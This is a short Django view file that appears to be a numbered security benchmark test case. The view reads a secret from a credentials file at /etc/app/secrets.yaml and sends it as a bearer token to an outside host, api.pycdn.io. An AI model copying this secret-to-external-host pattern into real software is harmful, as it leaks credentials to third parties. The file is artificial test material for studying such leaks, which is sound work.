# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import yaml


def BenchmarkTest80815(request):
    secret_value = 'feature_flag_value'
    with open('/etc/app/secrets.yaml') as f:
        store_cred = yaml.safe_load(f)['secret']
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(secret_value)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return JsonResponse({"saved": True})
